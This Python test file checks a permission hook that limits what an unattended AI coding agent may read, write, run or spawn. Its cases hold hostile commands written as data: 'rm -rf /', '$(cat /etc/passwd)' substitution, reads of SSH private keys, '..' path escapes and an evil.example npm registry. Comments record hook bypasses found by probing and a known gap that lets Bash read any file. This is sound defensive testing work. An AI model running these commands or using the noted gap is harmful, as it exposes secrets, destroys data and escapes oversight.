#!/usr/bin/env python3
"""Test harness for .claude/hooks/unattended-decide.py (Proteus copy).

Runs the hook as a subprocess with a bound marker and asserts allow/deny per case. Restores the
marker file afterwards. Exit 0 on all pass, 1 otherwise.

    python3 /Users/triton/PROTEUS/bin/test-hook.py
"""
import json
import os
import subprocess
import sys
import time

ROOT = "/Users/triton/PROTEUS/"
# The hook beside this script, so a worktree tests its own copy. The marker stays in ROOT because
# that is where the hook reads it.
HOOK = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), ".claude/hooks/unattended-decide.py")
MARKER = ROOT + "state/unattended-session.json"
SID = "test-session-0001"

CASES = [
    # (tool, tool_input, expected)
    ("Read", {"file_path": ROOT + "CHARTER.md"}, "allow"),
    ("Read", {"file_path": "/etc/hosts"}, "deny"),
    ("Write", {"file_path": ROOT + "grinder/LEDGER.csv"}, "allow"),
    ("Write", {"file_path": "/Users/triton/OBSIDIAN/TRITON-CORE/Proteus/field-notes/2026-39.md"}, "allow"),
    ("Write", {"file_path": "/Users/triton/OBSIDIAN/TRITON-CORE/Systems/flywheel/ledger.yaml"}, "deny"),
    ("Edit", {"file_path": "/Users/triton/OBSIDIAN/XXIX/IVY_ROSE/HOME.md"}, "deny"),
    ("Edit", {"file_path": "/Users/triton/.openclaw/workspace/flywheel/bin/lane-sync.cjs"}, "deny"),
    ("Bash", {"command": "python3 " + ROOT + "grinder/scan.py --paper"}, "allow"),
    ("Bash", {"command": ROOT + ".venv/bin/python3 " + ROOT + "pitch/predict.py"}, "allow"),
    ("Bash", {"command": "python3 /Users/triton/OBSIDIAN/anything.py"}, "deny"),
    ("Bash", {"command": "node " + ROOT + "bin/build-lab.cjs"}, "allow"),
    ("Bash", {"command": "bash " + ROOT + "bin/mirror-vault.sh"}, "allow"),
    ("Bash", {"command": "git -C " + ROOT + " add -A"}, "allow"),
    ("Bash", {"command": "git -C " + ROOT + " commit -m pre-register"}, "allow"),
    ("Bash", {"command": "git -C " + ROOT + " push origin main"}, "allow"),
    ("Bash", {"command": "git -C /Users/triton/OBSIDIAN/XXIX add -A"}, "deny"),
    ("Bash", {"command": "git -C " + ROOT + " push upstream main"}, "deny"),
    ("Bash", {"command": "git -C " + ROOT + " reset --hard"}, "deny"),
    ("Bash", {"command": "curl -s https://api.dexscreener.com/latest/dex/search?q=pump"}, "allow"),
    ("Bash", {"command": "curl -s https://x.invalid | jq ."}, "allow"),
    ("Bash", {"command": "ls " + ROOT + " && rm -rf /"}, "deny"),
    ("Bash", {"command": "echo hi > " + ROOT + "x.txt"}, "deny"),
    ("Bash", {"command": "for i in 1 2; do echo $i; done"}, "deny"),
    ("Bash", {"command": "gh repo view triton-xxix/proteus-lab"}, "allow"),
    ("Bash", {"command": "gh repo create proteus-x"}, "deny"),
    ("Bash", {"command": "mkdir -p " + ROOT + "grinder/cache"}, "allow"),
    ("Bash", {"command": "mkdir -p /Users/triton/elsewhere"}, "deny"),
    ("Bash", {"command": "rm " + ROOT + "HALT"}, "deny"),
    ("mcp__Claude_Browser__get_page_text", {}, "allow"),
    ("Agent", {"prompt": "x"}, "deny"),
    # found by the first nightly run, 2026-09-22
    ("Bash", {"command": "git -C /Users/triton/PROTEUS status --short"}, "allow"),
    ("Bash", {"command": "git -C /Users/triton/PROTEUS commit -m \"nightly: pre-register for 2026-09-22\n\nGrinder: 94 rows\""}, "allow"),
    ("Bash", {"command": "grep -ohiE '(token|1024|frontmatter)' /Users/triton/PROTEUS/field-notes/x.md"}, "allow"),
    ("Bash", {"command": "git -C /Users/triton/PROTEUS commit -m \"$(cat /etc/passwd)\""}, "deny"),
    ("Bash", {"command": "echo \"a; b\" && rm -rf /"}, "deny"),
    ("ToolSearch", {"query": "select:WebFetch"}, "allow"),
    # bypasses in the quote-masking fix, found by probing it 2026-09-22. All six were allowed.
    # Escaped quotes are literal to bash and do NOT open a quoted string, so a regex that pairs
    # them up reads the rest of the line as an argument and misses the ';'.
    ("Bash", {"command": "echo a\\'b; rm -rf /tmp/x\\'c"}, "deny"),
    ("Bash", {"command": "echo \\'; rm -rf /tmp/y; echo \\'"}, "deny"),
    # '2>' is redirection too; the old regex only refused '>' when not preceded by a digit.
    ("Bash", {"command": "curl -s https://example.com 2>/Users/triton/.zshrc"}, "deny"),
    # '..' has to be resolved before the prefix comparison, or the folder check means nothing.
    ("Bash", {"command": "git -C /Users/triton/PROTEUS/../OBSIDIAN add -A"}, "deny"),
    ("Bash", {"command": "mkdir -p /Users/triton/PROTEUS/../../evil"}, "deny"),
    # KNOWN GAP, pinned here rather than fixed, because closing it is a policy call for Luke and
    # not a defect. The Read tool is held to READ_ROOTS, but cat/head/tail/grep via Bash are held
    # to nothing, so Bash can read anything on the disk. Tonight that freedom was used well (the
    # Field Notes item verified a claim against ~/.claude/skills), which is why it is not simply
    # clamped to the folder. A deny-list for .ssh/.aws/.gnupg/op config would be the cheap fix.
    ("Bash", {"command": "cat /Users/triton/PROTEUS/../.ssh/id_rsa"}, "allow"),
    ("Write", {"file_path": ROOT + "../OBSIDIAN/XXIX/IVY_ROSE/HOME.md"}, "deny"),
    ("Read", {"file_path": "/Users/triton/../../etc/passwd"}, "deny"),
    # variable expansion is not verifiable either, quoted or not
    ("Bash", {"command": "cat $HOME/.ssh/id_rsa"}, "deny"),
    ("Bash", {"command": "echo \"$HOME\""}, "deny"),
    # ...but the same characters inside single quotes are just text
    ("Bash", {"command": "grep -c 'a;b' " + ROOT + "x.md"}, "allow"),
    ("Bash", {"command": "grep -c 'cost $5 & up' " + ROOT + "x.md"}, "allow"),
    ("Bash", {"command": "git -C " + ROOT + " commit -m \"fix: for and while, 2>1; done\""}, "allow"),
    # ffmpeg/ffprobe, cp, npm: added 2026-10-07. The first two are the 6 Oct nightly's denials, verbatim.
    ("Bash", {"command": "ffmpeg -hide_banner -loglevel error -y -ss 5 -i /Users/triton/PROTEUS/sandbox/p0065/01-flat-vector.mp4 -frames:v 1 -vf scale=640:-1 /Users/triton/PROTEUS/experiments/2026-10-07-P-0065/frame-5s.png"}, "allow"),
    ("Bash", {"command": "cp /Users/triton/PROTEUS/sandbox/p0065/cdp_render.py /Users/triton/PROTEUS/sandbox/p0065/inspect_mp4.py /Users/triton/PROTEUS/experiments/2026-10-07-P-0065/"}, "allow"),
    ("Bash", {"command": "ffprobe -v error -show_entries format=duration -of csv=p=0 " + ROOT + "sandbox/p0065/a.mp4"}, "allow"),
    ("Bash", {"command": "ffmpeg -r 30000/1001 -i " + ROOT + "sandbox/f/%05d.png -c:v libx264 " + ROOT + "sandbox/f/out.mp4"}, "allow"),
    ("Bash", {"command": "ffmpeg -f lavfi -i anullsrc=r=48000:cl=stereo -t 1 " + ROOT + "sandbox/x.wav"}, "allow"),
    ("Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 -vf subtitles=" + ROOT + "sandbox/a.srt " + ROOT + "sandbox/b.mp4"}, "allow"),
    ("Bash", {"command": "ffmpeg -y -i pipe:0 " + ROOT + "sandbox/x.mp4"}, "allow"),
    ("Bash", {"command": "ffprobe -v error -show_streams " + ROOT + "sandbox/a.mp4 | grep codec_name"}, "allow"),
    ("Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 /Users/triton/Desktop/out.mp4"}, "deny"),
    ("Bash", {"command": "ffmpeg -i /etc/hosts " + ROOT + "sandbox/x.txt"}, "deny"),
    ("Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 " + ROOT + "../evil.mp4"}, "deny"),
    ("Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 -vf movie=/Users/triton/.ssh/id_rsa " + ROOT + "sandbox/b.mp4"}, "deny"),
    ("Bash", {"command": "ffmpeg -i https://example.com/a.mp4 " + ROOT + "sandbox/a.mp4"}, "deny"),
    ("Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 -f flv rtmp://example.com/live"}, "deny"),
    ("Bash", {"command": "ffmpeg -i concat:" + ROOT + "a.mp4|" + ROOT + "b.mp4 " + ROOT + "c.mp4"}, "deny"),
    ("Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 sandbox/out.mp4"}, "deny"),
    ("Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 ~/out.mp4"}, "deny"),
    ("Bash", {"command": "ffmpeg -progress /tmp/p.txt -i " + ROOT + "sandbox/a.mp4 " + ROOT + "sandbox/b.mp4"}, "deny"),
    ("Bash", {"command": "ffmpeg -dump_attachment:t '' -i " + ROOT + "sandbox/a.mkv"}, "deny"),
    ("Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 " + ROOT + "sandbox/b.mp4; rm -rf /"}, "deny"),
    ("Bash", {"command": "cp -R " + ROOT + "sandbox/p0065 " + ROOT + "experiments/x/"}, "allow"),
    ("Bash", {"command": "cp " + ROOT + "field-notes/2026-W41.md /Users/triton/OBSIDIAN/TRITON-CORE/Proteus/field-notes/"}, "allow"),
    ("Bash", {"command": "cp " + ROOT + "sandbox/x /Users/triton/Desktop/"}, "deny"),
    ("Bash", {"command": "cp /Users/triton/.ssh/id_rsa " + ROOT + "sandbox/"}, "deny"),
    ("Bash", {"command": "cp -i " + ROOT + "sandbox/x " + ROOT + "sandbox/y"}, "deny"),
    ("Bash", {"command": "cp " + ROOT + "sandbox/x " + ROOT + "../OBSIDIAN/XXIX/x"}, "deny"),
    ("Bash", {"command": "cp " + ROOT + "sandbox/x"}, "deny"),
    ("Bash", {"command": "cp sandbox/x " + ROOT + "sandbox/y"}, "deny"),
    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/p0067 ci --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache"}, "allow"),
    ("Bash", {"command": "npm --prefix=" + ROOT + "sandbox/p0065 install --ignore-scripts --no-audit --no-fund --cache=" + ROOT + "sandbox/.npm-cache puppeteer-core@23.0.0 @scope/pkg ws@^8"}, "allow"),
    ("Bash", {"command": "npm install"}, "deny"),
    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/x install --cache " + ROOT + "sandbox/.npm-cache"}, "deny"),                    # scripts on
    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/x install --ignore-scripts"}, "deny"),                                         # ~/.npm cache
    ("Bash", {"command": "npm --prefix " + ROOT + "grinder install --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache"}, "deny"),
    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox install --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache"}, "deny"),
    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/../grinder install --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache"}, "deny"),
    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/x install -g --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache left-pad"}, "deny"),
    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/x install --ignore-scripts --registry=https://evil.example --cache " + ROOT + "sandbox/.npm-cache x"}, "deny"),
    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/x install --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache github:user/repo"}, "deny"),
    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/x install --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache https://x.example/p.tgz"}, "deny"),
    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/x install --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache file:../y"}, "deny"),
    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/x ci --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache left-pad"}, "deny"),
    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/x run build"}, "deny"),
    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/x exec --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache x"}, "deny"),
    ("Bash", {"command": "npx -y some-tool"}, "deny"),
]

# The cwd decides where ffmpeg's bare names land, so it must be the folder (2026-10-07).
CWD_CASES = [
    ({"cwd": "/Users/triton/PROTEUS"}, "Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 -report " + ROOT + "sandbox/b.mp4"}, "allow"),
    ({"cwd": "/Users/triton"}, "Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 -report " + ROOT + "sandbox/b.mp4"}, "deny"),
]


# Fan-out cases run with FANOUT_ENABLED overridden on, under a fresh session id each time so the
# spawn counter (which reads today's decisions log) starts from zero. The id begins with 't', which
# no real session id does (they are hex), so `grep -v '"session": "t'` drops every test line.
FANOUT_SID = "t%07x" % (int(time.time()) & 0xFFFFFFF)
CHILD = {"agent_id": "a-test-child-0001", "agent_type": "general-purpose"}
PARENT = {}
ON = {"PROTEUS_FANOUT_OVERRIDE": "1"}
FANOUT_CASES = [
    # (who, tool, tool_input, expected)
    # parent spawning, caps on type, isolation, model
    (PARENT, "Agent", {"subagent_type": "general-purpose", "model": "haiku", "prompt": "x"}, "allow"),   # 1
    (PARENT, "Agent", {"subagent_type": "Explore", "model": "sonnet", "prompt": "x"}, "allow"),          # 2
    (PARENT, "Agent", {"subagent_type": "general-purpose", "model": "opus", "prompt": "x"}, "deny"),
    (PARENT, "Agent", {"subagent_type": "general-purpose", "prompt": "x"}, "deny"),                       # model absent
    (PARENT, "Agent", {"subagent_type": "general-purpose", "model": "haiku", "isolation": "worktree", "prompt": "x"}, "deny"),
    (PARENT, "Agent", {"subagent_type": "Plan", "model": "haiku", "prompt": "x"}, "deny"),
    (PARENT, "Agent", {"subagent_type": "claude-code-guide", "model": "haiku", "prompt": "x"}, "deny"),
    # depth one
    (CHILD, "Agent", {"subagent_type": "general-purpose", "model": "haiku", "prompt": "x"}, "deny"),
    # child writes: scratch only
    (CHILD, "Write", {"file_path": ROOT + "sandbox/probe/out.txt"}, "allow"),
    (CHILD, "Write", {"file_path": ROOT + "state/agents/2026-09-24/child.md"}, "allow"),
    (CHILD, "Edit", {"file_path": ROOT + "state/runs/2026-09-24.md"}, "deny"),
    (CHILD, "Write", {"file_path": ROOT + "SPEND.md"}, "deny"),
    (CHILD, "Write", {"file_path": ROOT + "TRACK-RECORD.md"}, "deny"),
    (CHILD, "Write", {"file_path": ROOT + "grinder/LEDGER.csv"}, "deny"),
    (CHILD, "Write", {"file_path": ROOT + "pitch/PREDICTIONS.csv"}, "deny"),
    (CHILD, "Write", {"file_path": ROOT + "state/unattended-session.json"}, "deny"),
    (CHILD, "Write", {"file_path": "/Users/triton/OBSIDIAN/TRITON-CORE/Proteus/field-notes/x.md"}, "deny"),
    (CHILD, "Write", {"file_path": ROOT + "sandbox/../SPEND.md"}, "deny"),
    # child bash: no git writes, scripts from sandbox only, mkdir/touch in scratch only
    (CHILD, "Bash", {"command": "git -C " + ROOT + " status --short"}, "allow"),
    (CHILD, "Bash", {"command": "git -C " + ROOT + " add -A"}, "deny"),
    (CHILD, "Bash", {"command": "git -C " + ROOT + " commit -m x"}, "deny"),
    (CHILD, "Bash", {"command": "git -C " + ROOT + " push origin main"}, "deny"),
    (CHILD, "Bash", {"command": "git push origin main"}, "deny"),
    (CHILD, "Bash", {"command": "python3 " + ROOT + "sandbox/check_claims.py"}, "allow"),
    (CHILD, "Bash", {"command": ROOT + ".venv/bin/python3 " + ROOT + "sandbox/diag_pitch.py"}, "allow"),
    (CHILD, "Bash", {"command": ROOT + ".venv/bin/python3 " + ROOT + "grinder/paper.py --apply-rules"}, "deny"),
    (CHILD, "Bash", {"command": "bash " + ROOT + "bin/send-field-notes.sh"}, "deny"),
    (CHILD, "Bash", {"command": ROOT + "bin/run-nightly.sh"}, "deny"),
    (CHILD, "Bash", {"command": "node " + ROOT + "bin/build-lab.cjs"}, "deny"),
    (CHILD, "Bash", {"command": "curl -s https://api.dexscreener.com/latest/dex/search?q=pump"}, "allow"),
    (CHILD, "Bash", {"command": "cat " + ROOT + "CHARTER.md"}, "allow"),
    (CHILD, "Bash", {"command": "mkdir -p " + ROOT + "sandbox/probe"}, "allow"),
    (CHILD, "Bash", {"command": "mkdir -p " + ROOT + "grinder/cache"}, "deny"),
    (CHILD, "Bash", {"command": "touch " + ROOT + "state/agents/x"}, "allow"),
    (CHILD, "Bash", {"command": "touch " + ROOT + "HALT"}, "deny"),
    (CHILD, "Bash", {"command": "echo one; echo two"}, "deny"),                                      # parent rules still apply
    # child cp/ffmpeg/npm (2026-10-07): copy in from anywhere in the write roots, write only to scratch
    (CHILD, "Bash", {"command": "cp " + ROOT + "grinder/LEDGER.csv " + ROOT + "sandbox/probe/"}, "allow"),
    (CHILD, "Bash", {"command": "cp " + ROOT + "sandbox/probe/x.csv " + ROOT + "grinder/LEDGER.csv"}, "deny"),
    (CHILD, "Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 " + ROOT + "state/agents/b.png"}, "allow"),
    (CHILD, "Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 " + ROOT + "experiments/b.png"}, "deny"),
    (CHILD, "Bash", {"command": "npm --prefix " + ROOT + "sandbox/x ci --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache"}, "allow"),
    # child reads and browser: unchanged from the parent
    (CHILD, "Read", {"file_path": ROOT + "CHARTER.md"}, "allow"),
    (CHILD, "Read", {"file_path": "/etc/hosts"}, "deny"),
    (CHILD, "mcp__Claude_Browser__get_page_text", {}, "allow"),
    # the spawn cap: two allowed above, two more here, the fifth is denied
    (PARENT, "Agent", {"subagent_type": "general-purpose", "model": "haiku", "prompt": "x"}, "allow"),   # 3
    (PARENT, "Agent", {"subagent_type": "general-purpose", "model": "sonnet", "prompt": "x"}, "allow"),  # 4
    (PARENT, "Agent", {"subagent_type": "general-purpose", "model": "haiku", "prompt": "x"}, "deny"),    # 5, cap
    (PARENT, "Agent", {"subagent_type": "Explore", "model": "sonnet", "prompt": "x"}, "deny"),           # still capped
]


# Kill switch cases run with a HALT file present (created for the block, removed after; a real
# one, if present, is left alone and the block is skipped). Side effects are refused, the run log
# and the marker release are not, so a halted run can still say what happened.
HALT_FILE = ROOT + "HALT"
HALT_CASES = [
    ("Bash", {"command": "git -C " + ROOT + " push origin main"}, "deny"),
    ("Bash", {"command": "git -C " + ROOT + " commit -m x"}, "deny"),
    ("Bash", {"command": "git -C " + ROOT + " add -A"}, "deny"),
    ("Bash", {"command": "git push origin main"}, "deny"),
    ("Bash", {"command": "bash " + ROOT + "bin/send-field-notes.sh " + ROOT + "field-notes/2026-W39.md"}, "deny"),
    ("Bash", {"command": ROOT + "bin/send-field-notes.sh " + ROOT + "field-notes/2026-W39.md"}, "deny"),
    ("Agent", {"subagent_type": "general-purpose", "model": "haiku", "prompt": "x"}, "deny"),
    ("Bash", {"command": "git -C " + ROOT + " status --short"}, "allow"),
    ("Bash", {"command": "git -C " + ROOT + " fetch origin main"}, "allow"),
    ("Bash", {"command": "cat " + ROOT + "HALT"}, "allow"),
    ("Bash", {"command": "python3 " + ROOT + "bin/halt-check.py --report"}, "allow"),
    ("Bash", {"command": "bash " + ROOT + "bin/mirror-vault.sh"}, "allow"),
    ("Write", {"file_path": ROOT + "state/runs/2026-09-24.md"}, "allow"),
    ("Write", {"file_path": ROOT + "state/unattended-session.json"}, "allow"),
    ("Read", {"file_path": ROOT + "CHARTER.md"}, "allow"),
]


def run(tool, ti, sid=SID, who=None, env=None):
    payload = {"session_id": sid, "tool_name": tool, "tool_input": ti, "permission_mode": "default"}
    payload.update(who or {})
    full_env = dict(os.environ)
    full_env.update(env or {})
    p = subprocess.run([sys.executable, HOOK], input=json.dumps(payload), capture_output=True, text=True, env=full_env)
    if not p.stdout.strip():
        return "silent"
    try:
        return json.loads(p.stdout)["hookSpecificOutput"]["permissionDecision"]
    except Exception:
        return "unparsable:" + p.stdout[:80]


def main():
    os.makedirs(ROOT + "state", exist_ok=True)
    saved = None
    if os.path.exists(MARKER):
        with open(MARKER) as fh:
            saved = fh.read()
    with open(MARKER, "w") as fh:
        json.dump({"session_id": SID, "task": "test", "bound_at": time.time()}, fh)
    fails = 0
    try:
        for tool, ti, want in CASES:
            got = run(tool, ti)
            ok = got == want
            fails += 0 if ok else 1
            print(("PASS" if ok else "FAIL"), tool, json.dumps(ti)[:70], "want", want, "got", got)
        for who, tool, ti, want in CWD_CASES:
            got = run(tool, ti, who=who)
            ok = got == want
            fails += 0 if ok else 1
            print(("PASS" if ok else "FAIL"), "cwd", who["cwd"], tool, json.dumps(ti)[:50], "want", want, "got", got)
        # fan-out: rebind the marker to the fresh id, switch the feature on for the subprocess only
        with open(MARKER, "w") as fh:
            json.dump({"session_id": FANOUT_SID, "task": "test", "bound_at": time.time()}, fh)
        for who, tool, ti, want in FANOUT_CASES:
            got = run(tool, ti, sid=FANOUT_SID, who=who, env=ON)
            ok = got == want
            fails += 0 if ok else 1
            label = "child " if who else "parent"
            print(("PASS" if ok else "FAIL"), "fanout", label, tool, json.dumps(ti)[:60], "want", want, "got", got)
        # and with the feature forced off, the parent's Agent call is denied whatever it asks for
        got = run("Agent", {"subagent_type": "general-purpose", "model": "haiku", "prompt": "x"}, sid=FANOUT_SID,
                  env={"PROTEUS_FANOUT_OVERRIDE": "0"})
        ok = got == "deny"
        fails += 0 if ok else 1
        print(("PASS" if ok else "FAIL"), "fanout off", "Agent", "want deny got", got)
        # kill switch: HALT present, under the parent's rules, feature flags untouched
        if os.path.exists(HALT_FILE):
            print("SKIP halt block: a real HALT file is present; not touching it")
        else:
            with open(HALT_FILE, "w") as fh:
                fh.write("test-hook.py: temporary, removed when the block ends\n")
            try:
                for tool, ti, want in HALT_CASES:
                    got = run(tool, ti, sid=FANOUT_SID, env=ON)
                    ok = got == want
                    fails += 0 if ok else 1
                    print(("PASS" if ok else "FAIL"), "halted", tool, json.dumps(ti)[:60], "want", want, "got", got)
            finally:
                os.remove(HALT_FILE)
    finally:
        if saved is None:
            os.remove(MARKER)
        else:
            with open(MARKER, "w") as fh:
                fh.write(saved)
    print("%d cases, %d failed" % (len(CASES) + len(CWD_CASES) + len(FANOUT_CASES) + 1 + len(HALT_CASES), fails))
    sys.exit(1 if fails else 0)


if __name__ == "__main__":
    main()
